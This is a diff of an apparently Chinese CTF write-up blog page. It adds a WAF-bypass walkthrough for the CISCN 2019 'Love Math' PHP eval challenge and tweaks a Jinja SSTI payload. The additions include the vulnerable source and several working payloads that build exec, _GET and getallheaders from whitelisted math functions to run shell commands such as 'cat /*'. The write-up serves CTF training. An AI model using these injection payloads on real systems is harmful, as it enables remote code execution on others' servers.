@@ -434,9 +434,9 @@ for i in xrange(1,50):
 {{[].__class__.__base__.__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
 
 #hackbar
-{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}</code></pre>
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag||sleep 3').read() }}</code></pre>
 <p>之后再慢慢消化这类知识</p>
-<h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>算是一道写脚本的题目吧。源码给了3001个php</p>
+<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>算是一道写脚本的题目吧。源码给了3001个php</p>
 <p>文件，但是能用的webshell应该只有一个参数。参考加修改后的最终脚本如下</p>
 <pre><code class="python">import os
 import re
@@ -743,6 +743,67 @@ public function filter($string) {
 <p>用于过滤的字符只有<code>where</code>与<code>hacker</code>长度不同，又因序列化的操作在过滤之前。如果username中有<code>where</code>被替换成<code>hacker</code>，那么反序列化时的匹配username时就会提前结束1字符，要是我们加上34个<code>where</code>让它提前34个字符结束，那么匹配到的就是</p>
 <p><code>iluem</code>后边我们对photo进行的操作就逃逸出来了。因此我们可以构造</p>
 <pre><code>username[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p>然后传上去就可以在profile页面拿到<code>config.php</code>的<code>base64encode</code>了。</p>
+<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>源码如下</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET[&#39;c&#39;])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET[&#39;c&#39;];
+    if (strlen($content) &gt;= 80) {
+        die(&quot;太长了不会算&quot;);
+    }
+    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
+            die(&quot;请不要输入奇奇怪怪的字符&quot;);
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die(&quot;请不要输入奇奇怪怪的函数&quot;);
+        }
+    }
+    //帮你算出答案
+    eval(&#39;echo &#39;.$content.&#39;;&#39;);
+}</code></pre>
+<p>这道题限制了长度80，而且只能使用白名单里的函数。</p>
+<p>自己尝试了一种方式，直接进行命令执行，构造出<code>exec(&#39;cat /*&#39;)</code>，刚好79字符。</p>
+<pre><code class="php">?c=$pi=base_convert(47138,20,36)($pi(76478043844,9,34)(dechex(109270211243818)))
+#base_convert(47138,20,36)=&gt;exec
+#base_convert(76478043844,9,34)=&gt;hex2bin
+#dechex(109270211243818)=636174202f2a=&gt;asciihex(&#39;cat /*&#39;)</code></pre>
+<p>然后学习一下其他姿势</p>
+<h4 id="1、构造出-GET-1-这样形式"><a href="#1、构造出-GET-1-这样形式" class="headerlink" title="1、构造出$_GET[1]这样形式"></a>1、构造出<code>$_GET[1]</code>这样形式</h4><p>执行原理如下</p>
+<pre><code class="php">php &gt; $b=&#39;exec&#39;;
+php &gt; $c=&#39;whoami&#39;;
+php &gt; echo $b($c);
+root</code></pre>
+<p>因为下划线和字母都会被<code>preg_match_all</code>匹配，所以需要构造出<code>_GET</code>，过滤了<code>[</code>、<code>]</code>，但是可以用<code>{}</code>代替。大概需要构造出这样子<code>$_GET{1}($_GET{2})</code>就可以执行命令了。</p>
+<p>经过上边的尝试，很容易构造出</p>
+<pre><code class="php">php &gt; var_dump(base_convert(76478043844,9,34)(dechex(1598506324)));
+string(4) &quot;_GET&quot;</code></pre>
+<p>因此可以构造出如下</p>
+<pre><code class="php">?c=$pi=base_convert(47138,20,36)(dechex(1598506324)),$$pi{1}($$pi{2})&amp;1=exec&amp;2=cat /*</code></pre>
+<p>这样构造就完全不需要担心长度的问题了</p>
+<p>不过还有更短的办法，利用白名单里的字符进行构造</p>
+<p>这里通过异或的方法得到的最简短的两对<br><code>is_nan^64==&gt;_G</code><br><code>tan^15==&gt;ET</code></p>
+<p>同理可构造出</p>
+<pre><code class="php">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5)),$$pi{1}($$pi{2})&amp;1=exec&amp;2=cat /*</code></pre>
+<h4 id="2、从header传"><a href="#2、从header传" class="headerlink" title="2、从header传"></a>2、从header传</h4><pre><code class="php">base_convert(696468,10,36) =&gt; &quot;exec&quot;
+$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;
+exec(getallheaders(){1})</code></pre>
+<p>这里发现了一个问题，字符串太长的时候，好像进制转换就会出问题，最大字母为<code>s</code>所以至少需要29进制来转。</p>
+<p><img src="C:%5CUsers%5C18751%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200828185526103.png" alt="image-20200828185526103"></p>
+<p>结果只有30进制满足条件。至于其中原因暂时不明白，大概字符串太长就好像有这个问题。</p>
+<p>最终payload：</p>
+<pre><code class="php">?c=($pi=base_convert)(696468,10,36)($pi(8768397090111664438,10,30)(){1})
+ADD HEADER 1:cat /*</code></pre>
 
     </div>
   </div>
